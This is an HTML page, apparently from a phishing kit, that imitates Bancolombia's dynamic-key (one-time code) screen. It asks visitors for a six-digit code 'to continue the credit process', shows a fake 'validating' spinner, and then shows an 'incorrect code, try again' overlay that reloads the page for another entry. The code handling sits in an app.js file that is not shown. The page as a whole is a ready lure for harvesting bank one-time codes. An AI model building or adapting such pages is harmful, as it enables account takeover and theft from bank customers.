<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Clave Dinámica</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { width: 100%; height: 100%; margin: 0; padding: 0; overflow-x: hidden; }
        body { font-family: 'Open Sans', Arial, sans-serif; font-size: 16px; color: #2c2a29; line-height: 24px; background-color: #f9f9fa; display: flex; flex-direction: column; min-height: 100vh; }
        .decorative-background { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
        .header { display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; z-index: 10; }
        .header-logo { height: 35px; }
        .main-container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; position: relative; z-index: 10; }
        .login-card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1), 0 1px 4px rgba(0,0,0,0.06); padding: 50px 60px; max-width: 500px; width: 100%; }
        .card-title { color: #212121; font-size: 28px; font-weight: 700; margin-bottom: 30px; text-align: center; }
        .icon-container { width: 80px; height: 80px; background-color: #f5f5f5; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; }
        .icon-container svg { width: 40px; height: 40px; color: #666666; }
        .subtitle { font-size: 14px; color: #666666; margin-bottom: 40px; text-align: center; line-height: 1.5; }
        .code-inputs { display: flex; gap: 12px; margin-bottom: 40px; justify-content: center; }
        .code-input { width: 50px; height: 60px; border: none; border-bottom: 3px solid #e0e0e0; background-color: transparent; font-size: 32px; font-weight: 600; text-align: center; color: #212121; font-family: 'Open Sans', Arial, sans-serif; transition: border-color 0.3s ease; }
        .code-input:focus { outline: none; border-bottom-color: #fdda24; }
        .code-input.filled { border-bottom-color: #4caf50; }
        .submit-button { width: 100%; padding: 15px 32px; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: not-allowed; border: none; background-color: #e0e0e0; color: #999999; transition: all 0.3s ease; font-family: 'Open Sans', Arial, sans-serif; margin-bottom: 20px; }
        .submit-button.enabled { background-color: #fdda24; color: #212121; cursor: pointer; }
        .submit-button.enabled:hover { background-color: #fdd007; }
        .help-link { color: #212121; font-size: 14px; text-decoration: underline; font-weight: 600; cursor: pointer; text-align: center; display: block; }
        .footer-info { text-align: center; padding: 20px; position: relative; z-index: 10; }
        .footer-text { font-size: 11px; color: #666666; line-height: 1.4; }
        .loading-overlay { position: fixed; inset: 0; background: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.25s ease; }
        .loading-overlay.active { opacity: 1; pointer-events: all; }
        .loading-logo { height: 36px; width: auto; margin-bottom: 48px; }
        .spinner { width: 52px; height: 52px; margin-bottom: 36px; }
        .spinner svg { width: 52px; height: 52px; animation: spin 1s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        .loading-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 10px; text-align: center; }
        .loading-subtitle { font-size: 14px; color: #666; text-align: center; line-height: 1.55; max-width: 260px; }
        .error-overlay { position: fixed; inset: 0; background: #121212; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; text-align: center; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; }
        .error-overlay.active { opacity: 1; pointer-events: all; }
        .error-icon { width: 80px; height: 80px; border-radius: 50%; background: rgba(253, 218, 36, 0.1); display: flex; align-items: center; justify-content: center; margin-bottom: 24px; }
        .error-icon svg { width: 40px; height: 40px; stroke: #fdda24; }
        .error-title { font-size: 24px; font-weight: 700; color: #ffffff; margin-bottom: 12px; }
        .error-text { font-size: 15px; color: #b3b3b3; max-width: 400px; line-height: 1.6; margin-bottom: 32px; }
        .error-btn { background: #fdda24; color: #121212; border: none; padding: 14px 40px; border-radius: 30px; font-size: 16px; font-weight: 700; cursor: pointer; transition: transform 0.2s; }
        .error-btn:hover { transform: scale(1.05); }
    </style>
</head>
<body>
    <svg class="decorative-background" viewBox="0 0 1920 1080" preserveAspectRatio="none">
        <path d="M 0 900 Q 200 800, 400 720 Q 700 620, 960 560 Q 1300 480, 1600 380 Q 1750 330, 1920 270" stroke="#ff8855" stroke-width="32" fill="none" stroke-linecap="round"/>
        <path d="M 50 850 Q 250 750, 450 670 Q 750 570, 960 520 Q 1300 440, 1600 340 Q 1750 290, 1920 230" stroke="#fdd835" stroke-width="38" fill="none" stroke-linecap="round"/>
        <path d="M 350 720 Q 480 670, 630 640 Q 720 620, 800 610" stroke="#9c6fb8" stroke-width="28" fill="none" stroke-linecap="round"/>
        <path d="M 1350 420 Q 1500 360, 1650 320 Q 1780 290, 1900 270" stroke="#9c6fb8" stroke-width="30" fill="none" stroke-linecap="round"/>
    </svg>
    <div class="header"><img src="bancol.png" alt="Bancolombia" class="header-logo"></div>
    <main class="main-container">
        <div class="login-card">
            <h1 class="card-title">Ingresa tu clave dinámica</h1>
            <div class="icon-container">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
            </div>
            <p class="subtitle">Ingresa tu clave dinámica para verificar tu identidad y continuar con el proceso de tu crédito.</p>
            <div class="code-inputs" id="codeInputs">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit1">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit2">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit3">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit4">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit5">
                <input type="password" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]" id="digit6">
            </div>
            <button class="submit-button" id="btnSubmit" disabled>Continuar</button>
            <a href="#" class="help-link">¿Olvidaste tu usuario o clave?</a>
        </div>
    </main>
    <div class="loading-overlay" id="loadingOverlay">
        <img src="bancol.png" alt="Bancolombia" class="loading-logo">
        <div class="spinner"><svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="4"/><circle cx="26" cy="26" r="22" stroke="#FDDA24" stroke-width="4" stroke-linecap="round" stroke-dasharray="103 35" stroke-dashoffset="0"/></svg></div>
        <p class="loading-title">Validando clave dinamica.</p>
        <p class="loading-subtitle">Estamos confirmando tus datos</p>
    </div>
    <div id="errorOverlay" class="error-overlay">
        <div class="error-icon">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
        </div>
        <div class="error-title">Dinamica incorrecta</div>
        <div class="error-text">Dato ingresado erroneo , vuelve a intentar.</div>
        <button class="error-btn" onclick="window.location.reload()">Volver a intentar</button>
    </div>
    <script src="app.js"></script>
</body>
</html>
